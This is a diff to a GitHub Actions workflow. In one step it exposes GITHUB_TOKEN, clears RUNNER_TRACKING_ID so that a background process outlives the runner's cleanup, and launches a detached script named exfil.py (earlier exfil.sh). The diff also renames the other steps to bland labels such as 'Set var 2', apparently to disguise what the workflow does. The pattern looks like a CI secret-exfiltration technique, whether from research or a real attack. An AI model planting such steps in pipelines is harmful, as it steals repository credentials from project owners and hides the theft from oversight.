@@ -16,17 +16,16 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "step 1" > step.txt
-          RUNNER_TRACKING_ID="" && (nohup bash exfil.sh &)
+          RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
 
-      - name: Export an environment variable
+      - name: Set var 2
         run: |
-          echo "step 2" > step.txt
-          echo "MY_TEST_VAR=hello-from-github-action" >> $GITHUB_ENV
-          echo "Exported MY_TEST_VAR"
-          sleep 3
+          TARGET_VAR=step2
+          echo "Set TARGET_VAR"
+          sleep 2
 
-      - name: Echo all environment variables
+      - name: Set var 3
         run: |
-          echo "Printing all environment variables:"
-          sleep 3
+          TARGET_VAR=step3
+          echo "Set TARGET_VAR"
+          sleep 2
